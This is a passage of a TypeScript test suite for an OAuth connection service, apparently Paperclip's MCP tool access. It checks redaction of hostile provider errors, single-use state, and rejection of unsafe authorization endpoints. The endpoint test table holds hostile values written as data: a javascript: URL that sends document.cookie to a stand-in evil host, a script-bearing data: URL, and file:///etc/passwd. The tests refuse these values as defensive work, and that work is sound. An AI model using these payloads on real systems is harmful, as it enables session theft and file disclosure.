    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture hostile token" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);

    const consoleSpy = captureConsole();
    const thrown = await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      iss: ISSUER,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    }).then(() => null, (error: unknown) => error);

    // Paperclip's own copy for `invalid_grant`, not a syllable of the provider's.
    expect(thrown).toMatchObject({
      status: 502,
      message: "The authorization server rejected the authorization code or refresh token.",
      details: { code: "oauth_token_exchange_failed", providerError: "invalid_grant", status: 400 },
    });

    const surfaces = await providerLeakSurfaces(consoleSpy, thrown);
    expect(surfaces).not.toContain(PROVIDER_CANARY);
    expect(surfaces).not.toContain("recovery key");
    // JSON-escaped ANSI introducer: an escape sequence would arrive as \u001b.
    expect(surfaces).not.toContain("\\u001b");
    expect(surfaces).not.toContain("<script>");
  });

  it("normalizes an unrecognized provider error code instead of echoing it", async () => {
    const hostileCode = `not_a_real_code_${"x".repeat(200)}`;
    const fixture = installMcpOAuthFixture({
      auth: "oauth",
      tokenFailure: { status: 503, body: { error: hostileCode, ...HOSTILE_ERROR_BODY } },
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture unknown code" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);

    const consoleSpy = captureConsole();
    const thrown = await service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      iss: ISSUER,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    }).then(() => null, (error: unknown) => error);

    // Off the allowlist, so the label collapses and the message falls back to
    // Paperclip's generic copy rather than naming the provider's code.
    expect(thrown).toMatchObject({
      status: 502,
      message: "OAuth token exchange failed",
      details: { code: "oauth_token_exchange_failed", providerError: "unrecognized", status: 503 },
    });

    const surfaces = await providerLeakSurfaces(consoleSpy, thrown);
    expect(surfaces).not.toContain("not_a_real_code");
    expect(surfaces).not.toContain(PROVIDER_CANARY);
  });

  it("redacts a hostile provider error from dynamic client registration", async () => {
    installMcpOAuthFixture({
      auth: "oauth",
      registrationFailure: { status: 400, body: { error: "invalid_redirect_uri", ...HOSTILE_ERROR_BODY } },
    });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture hostile dcr" });

    const consoleSpy = captureConsole();
    const thrown = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    }).then(() => null, (error: unknown) => error);

    expect(thrown).toMatchObject({
      status: 502,
      message: "The authorization server rejected Paperclip's callback URL.",
      details: {
        code: "oauth_dynamic_client_registration_failed",
        providerError: "invalid_redirect_uri",
        status: 400,
      },
    });

    const surfaces = await providerLeakSurfaces(consoleSpy, thrown);
    expect(surfaces).not.toContain(PROVIDER_CANARY);
    expect(surfaces).not.toContain("\\u001b");
  });

  it("redacts a hostile denial from the callback route and consumes the state", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
    installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const logChunks: string[] = [];
    const logStream = new Writable({
      write(chunk, _encoding, callback) {
        logChunks.push(chunk.toString());
        callback();
      },
    });
    const requestLogger = createHttpLogger(pino({ redact: [...HTTP_LOG_REDACT_PATHS] }, logStream));
    const app = createRouteApp(db, undefined, requestLogger);
    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture hostile denial" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const state = new URL(start.authorizationUrl).searchParams.get("state")!;

    const consoleSpy = captureConsole();
    const res = await request(app)
      .get("/api/tools/oauth/callback")
      .query({
        state,
        code: "oauth-authorization-code-canary-4d7e1f",
        error: "access_denied",
        error_description: HOSTILE_ERROR_DESCRIPTION,
        error_uri: HOSTILE_ERROR_BODY.error_uri,
      });

    expect(res.status).toBe(400);
    expect(res.body).toMatchObject({
      error: "The authorization server denied the request.",
      code: "oauth_authorization_denied",
      details: { code: "oauth_authorization_denied", providerError: "access_denied" },
    });
    expect(JSON.stringify(res.body)).not.toContain(PROVIDER_CANARY);
    expect(JSON.stringify(res.body)).not.toContain("\\u001b");

    const surfaces = await providerLeakSurfaces(consoleSpy, null);
    expect(surfaces).not.toContain(PROVIDER_CANARY);
    expect(surfaces).not.toContain("recovery key");

    const httpLog = logChunks.join("");
    expect(httpLog).not.toContain("oauth-authorization-code-canary-4d7e1f");
    expect(httpLog).not.toContain(PROVIDER_CANARY);
    expect(httpLog).not.toContain(HOSTILE_ERROR_DESCRIPTION);
    expect(httpLog).not.toContain(state);

    const logRecord = JSON.parse(httpLog.trim()) as {
      msg: string;
      req: { method: string; url: string; query?: unknown };
      reqQuery?: unknown;
    };
    expect(logRecord.msg).toBe("GET /api/tools/oauth/callback 400");
    expect(logRecord.req).toMatchObject({ method: "GET", url: "/api/tools/oauth/callback" });
    expect(logRecord.req.query).toBeUndefined();
    expect(logRecord.reqQuery).toBeUndefined();

    // A denial is terminal for the attempt, so the state cannot be replayed.
    await expect(db.select().from(toolOauthStates).where(eq(toolOauthStates.state, state))).resolves.toHaveLength(0);
  });

  it("returns browser denials to Permissions without reflecting provider-authored details", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
    installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const app = createRouteApp(db);
    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture browser denial",
    });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const state = new URL(start.authorizationUrl).searchParams.get("state")!;

    const res = await request(app)
      .get("/api/tools/oauth/callback")
      .set("Accept", "text/html")
      .query({
        state,
        error: "access_denied",
        error_description: HOSTILE_ERROR_DESCRIPTION,
        error_uri: HOSTILE_ERROR_BODY.error_uri,
      });

    expect(res.status).toBe(303);
    const location = new URL(res.headers.location, PUBLIC_BASE_URL);
    expect(location.pathname).toBe(`/${company.issuePrefix}/apps/${connected.connectionId}/permissions`);
    expect(location.searchParams.get("oauth")).toBe("denied");
    expect(location.searchParams.get("code")).toBe("oauth_authorization_denied");
    expect(res.headers.location).not.toContain(PROVIDER_CANARY);
    expect(res.headers.location).not.toContain("error_description");
    expect(res.headers.location).not.toContain("error_uri");
  });

  it("validates the callback state before acting on a provider-reported error", async () => {
    installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture unsolicited denial" });

    // An unsolicited callback carries no state Paperclip issued, so it is
    // rejected on that ground and never reaches the provider-error branch.
    await expect(service.completeOAuthCallback({
      state: "state-paperclip-never-issued",
      error: "access_denied",
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    })).rejects.toMatchObject({
      status: 400,
      message: "OAuth state was not found or has already been used",
    });
  });

  /**
   * PAP-17109 — a denial or a cancel is a final answer to an authorization
   * request, so it has to end the request rather than just fail the callback.
   * Left live, the `state` the user refused stays completable for the rest of its
   * TTL by anyone who can produce a code, and the board keeps showing a prompt
   * for a flow the user already declined.
   */
  describe("denied and cancelled callbacks", () => {
    it("stops a later code from completing a flow the user refused", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth" });
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const actor = { actorType: "user" as const, actorId: "board-user" };
      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture denied" });
      const start = await service.startOAuth(company.id, connected.connectionId, { redirectUri: REDIRECT_URI, actor });
      const state = new URL(start.authorizationUrl).searchParams.get("state")!;
      // Held before the denial on purpose: this is the whole attack. A code that
      // shows up after "no" must not be exchangeable.
      const code = fixture.issueAuthorizationCode(start.authorizationUrl);

      await expect(service.completeOAuthCallback({ state, error: "access_denied", redirectUri: REDIRECT_URI, actor }))
        .rejects.toMatchObject({ status: 400, details: { code: "oauth_authorization_denied" } });

      await expect(service.completeOAuthCallback({ state, code, iss: ISSUER, redirectUri: REDIRECT_URI, actor }))
        .rejects.toMatchObject({ status: 400, message: "OAuth state was not found or has already been used" });

      expect(fixture.requestsTo("/token")).toHaveLength(0);
      const [connection] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
      // Still a draft: nothing about the refused attempt made it a live connection.
      expect(connection).toMatchObject({ status: "draft" });
      expect(connection!.credentialSecretRefs.some((ref) => ref.configPath === "oauth.access_token")).toBe(false);
    });

    it("treats a cancel the same as a denial even when the provider names it its own way", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth" });
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const actor = { actorType: "user" as const, actorId: "board-user" };
      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture cancelled" });
      const start = await service.startOAuth(company.id, connected.connectionId, { redirectUri: REDIRECT_URI, actor });
      const state = new URL(start.authorizationUrl).searchParams.get("state")!;
      const code = fixture.issueAuthorizationCode(start.authorizationUrl);

      // Real providers invent their own cancel codes. Whether or not Paperclip
      // recognizes the label, the request is over.
      const thrown = await service.completeOAuthCallback({
        state,
        error: "user_cancelled_authorize",
        redirectUri: REDIRECT_URI,
        actor,
      }).then(() => null, (error: unknown) => error);
      expect(thrown).toMatchObject({ status: 400, details: { code: "oauth_authorization_denied" } });
      expect((thrown as Error).message).not.toContain("user_cancelled_authorize");

      await expect(db.select().from(toolOauthStates)).resolves.toHaveLength(0);
      await expect(service.completeOAuthCallback({ state, code, iss: ISSUER, redirectUri: REDIRECT_URI, actor }))
        .rejects.toMatchObject({ status: 400 });
      expect(fixture.requestsTo("/token")).toHaveLength(0);
    });

    it("will not let another session's denial spend a pending request", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth" });
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const owner = { actorType: "user" as const, actorId: "board-user", sessionId: "owner-session" };
      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture victim" });
      const start = await service.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: owner,
      });
      const state = new URL(start.authorizationUrl).searchParams.get("state")!;

      // Same user, different browser session.
      await expect(service.completeOAuthCallback({
        state,
        error: "access_denied",
        redirectUri: REDIRECT_URI,
        actor: { ...owner, sessionId: "other-session" },
      })).rejects.toMatchObject({ status: 403 });

      // A different user — which is also how a different company arrives, since a
      // state is bound to the actor id that started it and the callback route
      // authorizes against the state row's own company.
      await expect(service.completeOAuthCallback({
        state,
        error: "access_denied",
        redirectUri: REDIRECT_URI,
        actor: { ...owner, actorId: "someone-else" },
      })).rejects.toMatchObject({ status: 403 });

      // Neither refusal cost the owner anything: the request is still live and
      // still completable.
      await expect(db.select().from(toolOauthStates).where(eq(toolOauthStates.state, state))).resolves.toHaveLength(1);
      const code = fixture.issueAuthorizationCode(start.authorizationUrl);
      await expect(service.completeOAuthCallback({ state, code, iss: ISSUER, redirectUri: REDIRECT_URI, actor: owner }))
        .resolves.toMatchObject({ connectionId: connected.connectionId });
    });

    it("resolves the board's pending authorization prompt as rejected", async () => {
      installMcpOAuthFixture({ auth: "oauth" });
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const [agent] = await db.insert(agents).values({
        companyId: company.id,
        name: `Connector ${randomUUID()}`,
        role: "engineer",
        status: "idle",
        adapterType: "process",
        adapterConfig: {},
        runtimeConfig: {},
      }).returning();
      const [issue] = await db.insert(issues).values({
        companyId: company.id,
        title: "Connect the analytics app",
      }).returning();
      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture prompt" });

      // The agent-driven shape: the agent asks, the board user answers in the
      // provider's window, so the prompt's fate is decided by the callback.
      const start = await service.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: { actorType: "agent", actorId: agent!.id },
        subjectUserId: "board-user",
        issueId: issue!.id,
      });
      const [pending] = await db.select().from(issueThreadInteractions);
      expect(pending).toMatchObject({ kind: "request_confirmation", status: "pending" });

      await expect(service.completeOAuthCallback({
        state: new URL(start.authorizationUrl).searchParams.get("state")!,
        error: "access_denied",
        redirectUri: REDIRECT_URI,
        actor: { actorType: "user", actorId: "board-user" },
      })).rejects.toMatchObject({ status: 400, details: { code: "oauth_authorization_denied" } });

      const [resolved] = await db
        .select()
        .from(issueThreadInteractions)
        .where(eq(issueThreadInteractions.id, pending!.id));
      expect(resolved).toMatchObject({ status: "rejected", resolvedByUserId: "board-user" });
      expect(resolved!.result).toMatchObject({ outcome: "rejected" });
      expect(resolved!.resolvedAt).not.toBeNull();
      // The prompt's reason is Paperclip's own copy, never the provider's.
      expect(JSON.stringify(resolved!.result)).not.toContain("access_denied");
      await expect(db.select().from(toolOauthStates)).resolves.toHaveLength(0);
    });

    it("lets only one of two simultaneous callbacks exchange a code", async () => {
      const fixture = installMcpOAuthFixture({ auth: "oauth" });
      const company = await createCompany(db);
      const service = toolAccessService(db);
      const actor = { actorType: "user" as const, actorId: "board-user" };
      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture replay" });
      const start = await service.startOAuth(company.id, connected.connectionId, { redirectUri: REDIRECT_URI, actor });
      const state = new URL(start.authorizationUrl).searchParams.get("state")!;
      const code = fixture.issueAuthorizationCode(start.authorizationUrl);

      // A second database handle, because a race needs two connections: this
      // driver pipelines everything issued through one handle, which would
      // serialize the two callbacks and prove nothing. With two connections both
      // callbacks can read a live state row before either deletes it, so the
      // atomic `DELETE … RETURNING` is what picks the winner.
      const otherDb = createDb(tempDb!.connectionString);
      const otherService = toolAccessService(otherDb);
      let settled: PromiseSettledResult<unknown>[];
      try {
        // Connect before racing: paying TCP and startup latency inside the race
        // would just hand the first callback an uncontested head start.
        await otherDb.select().from(companies).limit(1);
        settled = await Promise.allSettled([
          service.completeOAuthCallback({ state, code, iss: ISSUER, redirectUri: REDIRECT_URI, actor }),
          otherService.completeOAuthCallback({ state, code, iss: ISSUER, redirectUri: REDIRECT_URI, actor }),
        ]);
      } finally {
        await otherDb.$client.end({ timeout: 5 });
      }

      expect(settled.filter((entry) => entry.status === "fulfilled")).toHaveLength(1);
      // The loser never reached the token endpoint at all.
      expect(fixture.requestsTo("/token")).toHaveLength(1);
      const rejection = settled.find((entry) => entry.status === "rejected") as PromiseRejectedResult;
      expect(rejection.reason).toMatchObject({
        status: 400,
        message: "OAuth state was not found or has already been used",
      });
    });
  });

  it("accepts an iss that differs only by a trailing slash", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture iss slash" });
    const start = await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    const code = fixture.issueAuthorizationCode(start.authorizationUrl);

    await expect(service.completeOAuthCallback({
      state: new URL(start.authorizationUrl).searchParams.get("state")!,
      code,
      iss: `${ISSUER}/`,
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    })).resolves.toMatchObject({ connectionId: connected.connectionId });
  });

  it("re-registers rather than reusing a client bound to a different callback", async () => {
    const fixture = installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture rebind" });
    await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    expect(fixture.requestsTo("/register")).toHaveLength(1);

    // Same redirect URI: the stored client is still bound, so nothing re-registers.
    await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });
    expect(fixture.requestsTo("/register")).toHaveLength(1);

    // Different callback origin: the binding no longer holds.
    await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: "https://other.fixture.test/api/tools/oauth/callback",
      actor: { actorType: "user", actorId: "board-user" },
    });
    expect(fixture.requestsTo("/register")).toHaveLength(2);
  });

  it("will not auto-re-register over a client the operator supplied", async () => {
    installMcpOAuthFixture({ auth: "oauth" });
    const company = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(company.id, {
      link: MCP_URL,
      name: "Fixture manual rebind",
      authMode: "oauth",
      oauthClient: { clientId: "operator-client" },
    });
    await service.startOAuth(company.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    });

    // The callback moved. Paperclip cannot re-register in the operator's console,
    // so it must stop and say so rather than silently minting a new client.
    await expect(service.startOAuth(company.id, connected.connectionId, {
      redirectUri: "https://other.fixture.test/api/tools/oauth/callback",
      actor: { actorType: "user", actorId: "board-user" },
    })).rejects.toMatchObject({ details: { code: "oauth_manual_client_rebinding_required" } });
  });

  /**
   * PAP-17099 — the authorization endpoint is the one discovered value Paperclip
   * hands to the operator's browser as a top-level navigation, so a hostile
   * server must not be able to advertise a scheme that runs code in the board's
   * origin, reads a local file, or downgrades the authorization request.
   */
  describe("unsafe advertised authorization endpoints", () => {
    it.each([
      ["javascript:", "javascript:fetch('https://evil.test/'+document.cookie)"],
      ["data:", "data:text/html,<script>alert(document.domain)</script>"],
      ["file:", "file:///etc/passwd"],
      ["plaintext http", "http://evil.fixture.test/authorize"],
      ["credentials disguising the origin", "https://mcp.fixture.test@evil.fixture.test/authorize"],
      ["a fragment", "https://auth.fixture.test/authorize#@evil.fixture.test"],
      ["a malformed url", "not-a-url"],
    ])("refuses to connect when the server advertises %s", async (_label, authorizationEndpoint) => {
      installMcpOAuthFixture({ auth: "oauth", authorizationEndpoint });
      const company = await createCompany(db);
      const service = toolAccessService(db);

      await expect(service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture hostile authorize" }))
        .rejects.toMatchObject({ status: 422, details: { code: "oauth_authorization_endpoint_rejected" } });

      // Nothing about the refused endpoint is persisted, so a later reconnect
      // cannot pick it back up out of the connection config.
      const [connection] = await db.select().from(toolConnections);
      expect(JSON.stringify(connection?.config ?? {})).not.toContain(authorizationEndpoint);
      await expect(db.select().from(toolOauthStates)).resolves.toHaveLength(0);
    });

    it("never navigates to a stored authorization endpoint that is unsafe", async () => {
      installMcpOAuthFixture({ auth: "oauth" });
      const company = await createCompany(db);
      const service = toolAccessService(db);

      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture poisoned config" });
      // A row written before the gate existed (or by any other writer) is not
      // trusted just because it is in Paperclip's own database.
      const poisonStoredAuthorizationUrl = async () => {
        const [row] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
        const poisoned = {
          ...row!.config,
          oauth: { ...(row!.config.oauth as Record<string, unknown>), authorizationUrl: "javascript:alert(1)" },
        };
        await db.update(toolConnections)
          .set({ config: poisoned, transportConfig: poisoned })
          .where(eq(toolConnections.id, connected.connectionId));
      };
      await poisonStoredAuthorizationUrl();

      // The stored value is discarded and re-discovered rather than opened.
      const start = await service.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: { actorType: "user", actorId: "board-user" },
      });
      expect(start.authorizationUrl.startsWith(`${ISSUER}/authorize?`)).toBe(true);

      // And when re-discovery cannot supply a safe endpoint, sign-in fails
      // closed with the reason instead of falling back to the stored value.
      await db.delete(toolOauthStates);
      await poisonStoredAuthorizationUrl();
      vi.restoreAllMocks();
      vi.spyOn(globalThis, "fetch").mockResolvedValue(jsonResponse({}, 404));
      await expect(service.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: { actorType: "user", actorId: "board-user" },
      })).rejects.toMatchObject({ status: 422, details: { code: "oauth_authorization_endpoint_rejected" } });
      await expect(db.select().from(toolOauthStates)).resolves.toHaveLength(0);
    });

    it("refuses an unsafe token endpoint even when the authorization endpoint is fine", async () => {
      installMcpOAuthFixture({ auth: "oauth", tokenEndpoint: "http://evil.fixture.test/token" });
      const company = await createCompany(db);
      const service = toolAccessService(db);

      await expect(service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture hostile token" }))
        .rejects.toMatchObject({ status: 422, details: { code: "oauth_token_endpoint_rejected" } });
    });

    it("allows loopback http only outside an authenticated public deployment", async () => {
      installMcpOAuthFixture({ auth: "oauth", authorizationEndpoint: "http://127.0.0.1:8930/authorize" });
      const company = await createCompany(db);
      // Default deployment = local development, where a loopback authorization
      // server is how someone tests their own MCP server.
      const service = toolAccessService(db);
      const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture loopback authorize" });
      const start = await service.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: { actorType: "user", actorId: "board-user" },
      });
      expect(new URL(start.authorizationUrl).origin).toBe("http://127.0.0.1:8930");

      // Same connection, same discovered endpoint, authenticated public
      // deployment: the local-development exception no longer applies.
      await db.delete(toolOauthStates);
      const publicService = toolAccessService(db, {
        deploymentMode: "authenticated",
        deploymentExposure: "public",
      });
      await expect(publicService.startOAuth(company.id, connected.connectionId, {
        redirectUri: REDIRECT_URI,
        actor: { actorType: "user", actorId: "board-user" },
      })).rejects.toMatchObject({ status: 422, details: { code: "oauth_authorization_endpoint_rejected" } });
    });
  });

  it("rejects a private-network endpoint in an authenticated public deployment", async () => {
    installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db, {
      deploymentMode: "authenticated",
      deploymentExposure: "public",
    });

    await expect(service.connectGalleryApp(company.id, {
      link: "http://127.0.0.1:8848/mcp",
      name: "Fixture loopback",
    })).rejects.toMatchObject({ details: { code: "remote_http_private_endpoint" } });
    await expect(db.select().from(toolConnections)).resolves.toHaveLength(0);
  });

  it("keeps generic connections inside their own company", async () => {
    installMcpOAuthFixture({ auth: "public" });
    const owner = await createCompany(db);
    const other = await createCompany(db);
    const service = toolAccessService(db);

    const connected = await service.connectGalleryApp(owner.id, { link: MCP_URL, name: "Fixture scoped" });

    await expect(service.getConnection(connected.connectionId, other.id)).rejects.toMatchObject({ status: 404 });
    await expect(service.startOAuth(other.id, connected.connectionId, {
      redirectUri: REDIRECT_URI,
      actor: { actorType: "user", actorId: "board-user" },
    })).rejects.toMatchObject({ status: 404 });
  });

  it("gives a generic connection the same review, access, install, gateway and revoke path", async () => {
    installMcpOAuthFixture({ auth: "public" });
    const company = await createCompany(db);
    const service = toolAccessService(db);
    const policy = toolAccessPolicyService(db);
    const [agent, outsideAgent] = await db.insert(agents).values([
      {
        companyId: company.id,
        name: `Generic MCP agent ${randomUUID()}`,
        role: "engineer",
        status: "active",
        adapterType: "process",
        adapterConfig: {},
        runtimeConfig: {},
      },
      {
        companyId: company.id,
        name: `Outside MCP agent ${randomUUID()}`,
        role: "engineer",
        status: "active",
        adapterType: "process",
        adapterConfig: {},
        runtimeConfig: {},
      },
    ]).returning();

    const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture governance" });
    const readEntry = connected.catalog.find((entry) => entry.toolName === "list_insights")!;
    const writeEntry = connected.catalog.find((entry) => entry.toolName === "create_insight")!;

    // Action selection: enable the read, leave the state-changing action off.
    const finished = await service.finishGalleryAppConnection(company.id, connected.connectionId, {
      enabledCatalogEntryIds: [readEntry.id],
      askFirstCatalogEntryIds: [],
      access: { agentIds: [agent!.id] },
    }, { actorType: "user", actorId: "board-user" });

    expect(finished.connection).toMatchObject({ status: "active", enabled: true });
    expect(finished.profile).toMatchObject({ profileKey: `app:${connected.connectionId}`, defaultAction: "deny" });
    expect(finished.profileBindings).toEqual([
      expect.objectContaining({ targetType: "agent", targetId: agent!.id }),
    ]);

    const decisionInput = (catalogEntryId: string, toolName: string, agentId = agent!.id) => ({
      companyId: company.id,
      actor: { actorType: "agent" as const, actorId: agentId, agentId },
      request: { connectionId: connected.connectionId, catalogEntryId, toolName },
    });

    // Action selection is what the app profile encodes: the enabled read is
    // allowed for the chosen agent, and the state-changing action the operator
    // left off is denied by the profile's `deny` default.
    await expect(policy.decide(decisionInput(readEntry.id, "list_insights")))
      .resolves.toMatchObject({ allowed: true, reasonCode: "allow_profile" });
    await expect(policy.decide(decisionInput(writeEntry.id, "create_insight")))
      .resolves.toMatchObject({ allowed: false, reasonCode: "deny_default" });
    await expect(policy.decide(decisionInput(readEntry.id, "list_insights", outsideAgent!.id)))
      .resolves.toMatchObject({ allowed: false, reasonCode: "deny_default" });

    // Simulate a profile written by the legacy install path. Saving installs
    // must self-heal this over-broad entry as well as avoiding it for new apps.
    await db.insert(toolProfileEntries).values({
      companyId: company.id,
      profileId: finished.profile.id,
      selectorType: "connection",
      effect: "include",
      applicationId: connected.connection.applicationId,
      connectionId: connected.connectionId,
    });

    // Installation targets the chosen agent, same as a curated connection.
    await service.putConnectionInstalls(connected.connectionId, {
      installs: [{ targetType: "agent", targetId: agent!.id, enabled: true }],
    }, { actorType: "user", actorId: "board-user" });
    const installs = await db.select().from(toolConnectionInstalls)
      .where(eq(toolConnectionInstalls.connectionId, connected.connectionId));
    expect(installs).toEqual([expect.objectContaining({ targetType: "agent", targetId: agent!.id })]);
    const installedProfileEntries = await db.select().from(toolProfileEntries)
      .where(eq(toolProfileEntries.profileId, finished.profile.id));
    expect(installedProfileEntries).not.toEqual(expect.arrayContaining([
      expect.objectContaining({
        selectorType: "connection",
        connectionId: connected.connectionId,
        effect: "include",
      }),
    ]));
    await expect(policy.decide(decisionInput(readEntry.id, "list_insights")))
      .resolves.toMatchObject({ allowed: true, reasonCode: "allow_profile" });
    await expect(policy.decide(decisionInput(writeEntry.id, "create_insight")))
      .resolves.toMatchObject({ allowed: false, reasonCode: "deny_default" });

    // Revoke: archiving the connection removes access but keeps the trail.
    await service.archiveConnection(connected.connectionId, company.id);
    const afterRevoke = await policy.decide(decisionInput(readEntry.id, "list_insights"));
    expect(afterRevoke.allowed).toBe(false);

    const auditEvents = await db.select().from(toolAccessAuditEvents)
      .where(eq(toolAccessAuditEvents.companyId, company.id));
    expect(auditEvents.length).toBeGreaterThan(0);
  });

  /**
   * The help prompt tells an agent exactly what JSON shape to return. Prove that
   * shape survives the real preview parser, using the example lifted out of the
   * prompt itself rather than a hand-copied duplicate — otherwise the prompt and
   * the parser can drift and only an operator would find out.
   */
  it("parses the JSON shape the help prompt asks an agent for", async () => {
    const service = toolAccessService(db);
    const jsonBlock = MCP_CONFIG_HELP_PROMPT.slice(
      MCP_CONFIG_HELP_PROMPT.indexOf("{"),
      MCP_CONFIG_HELP_PROMPT.lastIndexOf("}") + 1,
    );
    // Sanity-check the extraction before relying on it.
    expect(() => JSON.parse(jsonBlock)).not.toThrow();

    const preview = await service.previewMcpJsonImport({ mcpJson: jsonBlock });

    expect(preview.drafts).toHaveLength(1);
    expect(preview.drafts[0]).toMatchObject({ transport: "mcp_remote" });
    expect(preview.drafts[0]!.config).toMatchObject({ url: "https://mcp.example.com/mcp" });
    // The placeholder header name comes through as a field to ask the operator
    // for, which is exactly what the prompt promises will happen.
    expect(preview.drafts[0]!.credentialFields.map((field) => field.configPath))
      .toContain("headers.Authorization");
  });

  it("serves a client metadata document with no company or secret data", async () => {
    const company = await createCompany(db);
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
    const app = createRouteApp(db);

    const response = await request(app).get("/api/tools/oauth/client-metadata").expect(200);

    expect(response.body).toMatchObject({
      client_id: CLIENT_METADATA_DOCUMENT_URL,
      redirect_uris: [REDIRECT_URI],
      token_endpoint_auth_method: "none",
      application_type: "web",
    });
    expect(JSON.stringify(response.body)).not.toContain(company.id);
  });

  it("uses the configured auth origin for self-hosted OAuth callbacks", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", "https://public.paperclip.example");
    vi.stubEnv("PAPERCLIP_AUTH_PUBLIC_BASE_URL", "https://auth.paperclip.example");
    const app = createRouteApp(db);

    const response = await request(app).get("/api/tools/oauth/client-metadata").expect(200);

    expect(response.body.redirect_uris).toEqual([
      "https://auth.paperclip.example/api/tools/oauth/callback",
    ]);
  });

  it("uses the managed runtime origin when no explicit callback origin is configured", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", "");
    vi.stubEnv("PAPERCLIP_AUTH_PUBLIC_BASE_URL", "");
    vi.stubEnv("BETTER_AUTH_URL", "");
    vi.stubEnv("BETTER_AUTH_BASE_URL", "");
    vi.stubEnv("PAPERCLIP_MANAGED_RUNTIME_PUBLIC_URL", "https://worktree.tail29c1aa.ts.net");
    const app = createRouteApp(db);

    const response = await request(app).get("/api/tools/oauth/client-metadata").expect(200);

    expect(response.body.redirect_uris).toEqual([
      "https://worktree.tail29c1aa.ts.net/api/tools/oauth/callback",
    ]);
  });

  it("keeps an explicit callback origin ahead of managed runtime inference", async () => {
    vi.stubEnv("PAPERCLIP_PUBLIC_URL", PUBLIC_BASE_URL);
